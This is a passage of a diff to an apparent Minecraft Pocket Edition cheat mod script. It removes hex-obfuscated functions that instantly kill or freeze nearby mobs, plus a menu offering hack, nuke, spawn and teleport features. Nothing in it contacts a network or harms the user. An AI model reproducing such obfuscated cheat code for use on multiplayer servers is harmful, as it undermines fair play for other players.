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";
 
-var GUIPos = Gravity.CENTER;
-var GUIPos2 = Gravity.RIGHT;
-var GUIPos3 = Gravity.LEFT;
-
-var checkForUpdate=false;
-var updateWindow=false; 
-var newUpdate;
-var updateMod;
-                
-var defaultDestroyTime = [
-null, 1.5, 0.6, 0.5, 2, 2, 0, -1, null, null, null, null, 
-0.5, 0.6, 3, 3, 3, 2, 0.2, 0.6, 0.3, 3, 3, null, 0.8, null, 
-0.2, 0.7, null, null, 4, 0, 0, null, null, 0.8, null, 0, 
-0, 0, 0, 3, 5, 2, 2, 2, 0, 1.5, 2, 50, 0, 0, null, 2, 2.5, 
-null, 3, 5, 2.5, 0, 0.6, 3.5, 3.5, 1, 3, 0.4, 0.7, 2, 1, 
-null, null, 5, null, 3, 3, null, null, null, 0.1, 0.5, 0.2, 
-0.4, 0.6, 0, null, 2, 1, 0.4, 0.3, null, 1, 0.5, null, null, 
--1, 3, null, 1.5, null, null, 5, 0.3, 1, 0, 0, null, 2, 2, 
-1.5, null, null, 2, null, 2, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, 0.8, null, 
-null, null, null, null, 2, 2, 2, null, null, 2, null, 0, 0, 
-null, null, null, null, null, null, null, null, null, null, 
-null, null, 0.8, 0.8, 2, 2, null, null, null, null, null, null, 
-null, null, null, null, null, 0.5, 0.1, 5, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, null, null, null, null, null, null, null, null, null, null, 
-null, 0, 3.5, 50, 5, 0.6, 0.6, 5, null, null, null, null, 0
-]; 
-
-//you copy my script i copy yours
-function healthIndicators() {
-    var mobs = Entity.getAll();
-
-    for(var i = 0; i < mobs.length; i++) {
-
-
-        var xq = Entity.getX(mobs[i]) - getPlayerX();
-
-        var yq = Entity.getY(mobs[i]) - getPlayerY();
-
-        var zq = Entity.getZ(mobs[i]) - getPlayerZ();
-
-
-
-        if(xq * xq + yq * yq + zq * zq <= 40 * 40 && mobs[i] != getPlayerEnt()) {
-
-            if(Entity.getEntityTypeId(mobs[i]) == 10) {
-                Entity.setNameTag(mobs[i], nameColor + "Chicken " + healthColor + Entity.getHealth(mobs[i]) + "/4"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 11) {
-                Entity.setNameTag(mobs[i], nameColor + "Cow " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 12) {
-                Entity.setNameTag(mobs[i], nameColor + "Pig " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 13) {
-                Entity.setNameTag(mobs[i], nameColor + "Sheep " + healthColor + Entity.getHealth(mobs[i]) + "/8"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 14) {
-                Entity.setNameTag(mobs[i], nameColor + "Wolf " + healthColor + Entity.getHealth(mobs[i]) + "/8"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 15) {
-                Entity.setNameTag(mobs[i], nameColor + "Villager " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 16) {
-                Entity.setNameTag(mobs[i], nameColor + "Mooshroom " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 17) {
-                Entity.setNameTag(mobs[i], nameColor + "Squid " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-if(Entity.getEntityTypeId(mobs[i]) == 18) {
-                Entity.setNameTag(mobs[i], nameColor + "Rabbit " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 19) {
-                Entity.setNameTag(mobs[i], nameColor + "Bat " + healthColor + Entity.getHealth(mobs[i]) + "/6"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 20) {
-                Entity.setNameTag(mobs[i], nameColor + "Iron Golem " + healthColor + Entity.getHealth(mobs[i]) + "/100"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 21) {
-                Entity.setNameTag(mobs[i], nameColor + "Snow Golem " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 22) {
-                Entity.setNameTag(mobs[i], nameColor + "Ocelot " + healthColor + Entity.getHealth(mobs[i]) + "/10"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 32) {
-                Entity.setNameTag(mobs[i], nameColor + "Zombie " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 33) {
-                Entity.setNameTag(mobs[i], nameColor + "Creeper " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 34) {
-                Entity.setNameTag(mobs[i], nameColor + "Skeleton " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 35) {
-                Entity.setNameTag(mobs[i], nameColor + "Spider " + healthColor + Entity.getHealth(mobs[i]) + "/16"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 36) {
-                Entity.setNameTag(mobs[i], nameColor + "Zombie Pigman " + healthColor + Entity.getHealth(mobs[i]) + "/20"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 37) {
-                Entity.setNameTag(mobs[i], nameColor + "Slime " + healthColor + Entity.getHealth(mobs[i]) + "/16"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 38) {
-                Entity.setNameTag(mobs[i], nameColor + "Enderman " + healthColor + Entity.getHealth(mobs[i]) + "/40"); 
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 39) {
-                Entity.setNameTag(mobs[i], nameColor + "Silverfish " + healthColor + Entity.getHealth(mobs[i]) + "/8");
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 40) {
-                Entity.setNameTag(mobs[i], nameColor + "Cave Spider " + healthColor + Entity.getHealth(mobs[i]) + "/12");
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 41) {
-                Entity.setNameTag(mobs[i], nameColor + "Ghast " + healthColor + Entity.getHealth(mobs[i]) + "/10");
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 42) {
-                Entity.setNameTag(mobs[i], nameColor + "Magma Cube " + healthColor + Entity.getHealth(mobs[i]) + "/16");
-            }
-            if(Entity.getEntityTypeId(mobs[i]) == 43) {
-                Entity.setNameTag(mobs[i], nameColor + "Blaze " + healthColor + Entity.getHealth(mobs[i]) + "/20");
-            }
-if(Entity.getEntityTypeId(mobs[i]) == 44) {
-                Entity.setNameTag(mobs[i], nameColor + "Zombie Villager " + healthColor + Entity.getHealth(mobs[i]) + "/20");
-            }
-if(Entity.getEntityTypeId(mobs[i]) == 45) {
-                Entity.setNameTag(mobs[i], nameColor + "Witch " + healthColor + Entity.getHealth(mobs[i]) + "/26");
-            }
-        }
-    }
-}
-
-var _0x87b8=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x48\x65\x61\x6C\x74\x68"];function killing(){var _0x816ax2=Entity[_0x87b8[0]]();for(var _0x816ax3=0;_0x816ax3<_0x816ax2[_0x87b8[1]];_0x816ax3++){var _0x816ax4=Entity[_0x87b8[2]](_0x816ax2[_0x816ax3])-getPlayerX();var _0x816ax5=Entity[_0x87b8[3]](_0x816ax2[_0x816ax3])-getPlayerY();var _0x816ax6=Entity[_0x87b8[4]](_0x816ax2[_0x816ax3])-getPlayerZ();if(_0x816ax4*_0x816ax4+_0x816ax5*_0x816ax5+_0x816ax6*_0x816ax6<=20*20&&_0x816ax2[_0x816ax3]!=getPlayerEnt()){if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==10){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==11){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==12){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==13){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==14){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==15){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==16){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==17){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==18){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==19){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==20){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==21){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==22){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==32){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==33){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==34){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==35){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==36){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==37){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==38){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==39){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==40){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==41){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==42){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==43){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==44){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)};if(Entity[_0x87b8[5]](_0x816ax2[_0x816ax3])==45){Entity[_0x87b8[6]](_0x816ax2[_0x816ax3],0)}}}}
-
-var _0xcaf6=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x49\x6D\x6D\x6F\x62\x69\x6C\x65"];function killingf(){var _0xe017x2=Entity[_0xcaf6[0]]();var _0xe017x3=true;if(killfaura==false){_0xe017x3=false};for(var _0xe017x4=0;_0xe017x4<_0xe017x2[_0xcaf6[1]];_0xe017x4++){var _0xe017x5=_0xe017x2[_0xe017x4];var _0xe017x6=Entity[_0xcaf6[2]](_0xe017x2[_0xe017x4])-getPlayerX();var _0xe017x7=Entity[_0xcaf6[3]](_0xe017x2[_0xe017x4])-getPlayerY();var _0xe017x8=Entity[_0xcaf6[4]](_0xe017x2[_0xe017x4])-getPlayerZ();if(_0xe017x6*_0xe017x6+_0xe017x7*_0xe017x7+_0xe017x8*_0xe017x8<=20*20&&_0xe017x2[_0xe017x4]!=getPlayerEnt()){if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==10){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==11){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==12){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==13){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==14){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==15){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==16){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==17){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==18){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==19){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==20){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==21){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==22){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==32){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==33){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==34){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==35){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==36){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==37){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==38){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==39){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==40){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==41){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==42){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==43){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==44){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)};if(Entity[_0xcaf6[5]](_0xe017x2[_0xe017x4])==45){Entity[_0xcaf6[6]](_0xe017x5,_0xe017x3)}}}}
-
-function dip2px(dips){
-    return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
-}
-
-function newLevel(){ 
-clientMessage(client + "§2Mods are enabling...");
-var healthy = true;
-}
+/***********************/
 
 function showMenuBtn(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -350,14 +235,12 @@ ctx.runOnUiThread(new Runnable({ run: function(){
         var layout = new LinearLayout(ctx);
         layout.setOrientation(1);
         var menuBtn = new Button(ctx);
-menuBtn.setTextSize(24);
+menuBtn.setTextSize(20);
         menuBtn.setBackgroundDrawable(new android.graphics.drawable.BitmapDrawable(android.graphics.BitmapFactory.decodeByteArray(android.util.Base64.decode(bg64, 0) , 0, android.util.Base64.decode(bg64, 0).length)));
-        menuBtn.setTextColor(Color.WHITE);
+        //menuBtn.setText("");
         menuBtn.setOnClickListener(new View.OnClickListener({
             onClick: function(viewarg){
- mainMenu()
-//exit(); 
-headerView();
+mainMenu();
 menuBtn = null;
             }
         }));
@@ -384,315 +267,19 @@ function mainMenu(){
             menuScroll.addView(menuLayout);
             menuLayout1.addView(menuScroll);
 
-            var name = new TextView(ctx);
-            name.setTextSize(25);
-            name.setText("");
-            name.setTextColor(GUIName);
-            name.setGravity(Gravity.CENTER);
-            menuLayout.addView(name);
-
-var maker = new TextView(ctx);
-            maker.setTextSize(20);
-            maker.setText("");
-            maker.setTextColor(GUIName);
-            maker.setGravity(Gravity.CENTER);
-            menuLayout.addView(maker);
-
-var no = new TextView(ctx);
-            no.setTextSize(25);
-            no.setText("");
-            no.setTextColor(GUIName);
-            no.setGravity(Gravity.CENTER);
-            menuLayout.addView(no);
-
-var btn1 = new android.widget.Button(ctx);
-		btn1.setText("Settings");
-if(GetLang=="de_DE")btn1.setText("Einstellungen");
-if(GetLang=="ko_KR")btn1.setText('설정');
-
-if(GetLang=="es_MX")btn1.setText('Configuración');
-//btn1.setTextColor(Color.BLUE);
-		btn1.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-lmenu_menu(); 
-//exitUI.dismiss(); 
-menu.dismiss(); 
-header.dismiss();
-			}
-		});
-		menuLayout.addView(btn1);
-
-var btn2 = new android.widget.Button(ctx);
-btn2.setText("Hack Menu");
-if(GetLang=="de_DE")btn2.setText('Hack Menü');
-if(GetLang=="ko_KR")btn2.setText('해킹 메뉴');
-
-if(GetLang=="es_MX")btn2.setText('Menú de hacks');
-//btn2.setTextColor(Color.BLUE);
-		btn2.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
- cmenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
-		});
-menuLayout.addView(btn2);
-
-var zz = new android.widget.Button(ctx);
-zz.setText("ModPE Menu");
-if(GetLang=="de_DE")zz.setText('Modpe Menü');
-if(GetLang=="ko_KR")zz.setText('ModPE 메뉴');
-
-if(GetLang=="es_MX")zz.setText('Menú de Modpe');
-//zz.setTextColor(Color.BLUE);
-		zz.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             zmenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
-		});
-		menuLayout.addView(zz);
-
-var btn3 = new android.widget.Button(ctx);
-		btn3.setText("Spawn Menu");
-if(GetLang=="de_DE")btn3.setText('Spawn Menü');
-if(GetLang=="ko_KR")btn3.setText('스폰 메뉴');
-
-if(GetLang=="es_MX")btn3.setText('Menú de spawn');
-//btn3.setTextColor(Color.BLUE);
-		btn3.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             smenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
-		});
-		menuLayout.addView(btn3);
-
-var btn4 = new android.widget.Button(ctx);
-		btn4.setText("Effect Menu");
-if(GetLang=="de_DE")btn4.setText('Effekt Menü');
-if(GetLang=="ko_KR")btn4.setText('효과 메뉴');
-
-if(GetLang=="es_MX")btn4.setText('Menú de efectos');
-//btn4.setTextColor(Color.BLUE);
-		btn4.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             emenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-clientMessage(client + "§cMenu doesn't work in servers.");
-			}
-		});
-		menuLayout.addView(btn4);
-
-var btn5 = new android.widget.Button(ctx);
-            btn5.setText("Teleport Menu");
-if(GetLang=="de_DE")btn5.setText('Teleport Menü');
-if(GetLang=="ko_KR")btn5.setText('텔레포트 메뉴');
-
-if(GetLang=="es_MX")btn5.setText('teletransportación');
-//btn5.setTextColor(Color.BLUE);
-            btn5.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-menu.dismiss();
-//exitUI.dismiss();
-TeleMenu();
-header.dismiss();
-                }
-            }));
-            menuLayout.addView(btn5);
-
-var btn6 = new android.widget.Button(ctx);
-		btn6.setText("Nuke Menu");
-if(GetLang=="de_DE")btn6.setText('Bomben Menü');
-if(GetLang=="ko_KR")btn6.setText('핵폭탄 메뉴');
-
-if(GetLang=="es_MX")btn6.setText('Menú de bomba nuclear');
-//btn6.setTextColor(Color.BLUE);
-		btn6.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             nmenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
-		});
-		menuLayout.addView(btn6);
-
-var btn7 = new android.widget.Button(ctx);
-            btn7.setText("Give Menu");
-if(GetLang=="de_DE")btn7.setText('Item Menü');
-if(GetLang=="ko_KR")btn7.setText('아이템 주기 메뉴');
-
-if(GetLang=="es_MX")btn7.setText('Menú de tener');
-//btn7.setTextColor(Color.BLUE);
-            btn7.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-menu.dismiss();
-//exitUI.dismiss();
-GiveMenu();
-header.dismiss();
-clientMessage(client + "§cKits doesn't work in servers.");
-                }
-            }));
-            menuLayout.addView(btn7);
-
-var btn8 = new android.widget.Button(ctx);
-		btn8.setText("Speed Menu");
-if(GetLang=="de_DE")btn8.setText('Speed Menü');
-if(GetLang=="ko_KR")btn8.setText('속도 메뉴');
-
-if(GetLang=="es_MX")btn8.setText('Menú de velocidad');
-//btn8.setTextColor(Color.BLUE);
-		btn8.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             dmenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
-		});
-		menuLayout.addView(btn8);
-
-var btn10 = new android.widget.Button(ctx);
-            btn10.setText("Experience Menu");
-if(GetLang=="de_DE")btn10.setText('XP Menü');
-if(GetLang=="ko_KR")btn10.setText('경험치 메뉴');
-
-if(GetLang=="es_MX")btn10.setText('Menú de experiencia');
-//btn10.setTextColor(Color.BLUE);
-            btn10.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-ExMenu();
-menu.dismiss();
-//exitUI.dismiss();
-header.dismiss();
-                }
-            }));
-            menuLayout.addView(btn10);
-
-var btn13 = new android.widget.Button(ctx);
-            btn13.setText("Morph Menu");
-if(GetLang=="de_DE")btn13.setText('Morph Menü');
-if(GetLang=="ko_KR")btn13.setText('변신 메뉴');
-
-if(GetLang=="es_MX")btn13.setText('Menú de Morph');
-//btn13.setTextColor(Color.BLUE);
-            btn13.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-mMenu();
-menu.dismiss();
-//exitUI.dismiss();
-clientMessage(client + "§cMenu doesn't work in servers.");
-header.dismiss();
-                }
-            }));
-            menuLayout.addView(btn13);
-
-var btn11 = new android.widget.Button(ctx);
-            btn11.setText("Weather Menu");
-if(GetLang=="de_DE")btn11.setText('Wetter Menü');
-if(GetLang=="ko_KR")btn11.setText('날씨 메뉴');
-
-if(GetLang=="es_MX")btn11.setText('Menú de clima');
-//btn11.setTextColor(Color.BLUE);
-            btn11.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-WaMenu();
-menu.dismiss();
-//exitUI.dismiss();
-header.dismiss();
-                }
-            }));
-            menuLayout.addView(btn11);
-
-var btn12 = new android.widget.Button(ctx);
-		btn12.setText("Time Menu");
-if(GetLang=="de_DE")btn12.setText('Zeit Menü');
-if(GetLang=="ko_KR")btn12.setText('시간 메뉴');
-
-if(GetLang=="es_MX")btn12.setText('Menú de tiempo');
-//btn12.setTextColor(Color.BLUE);
-		btn12.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-             amenu_menu();
-             menu.dismiss();
-             //exitUI.dismiss();
-header.dismiss();
-			}
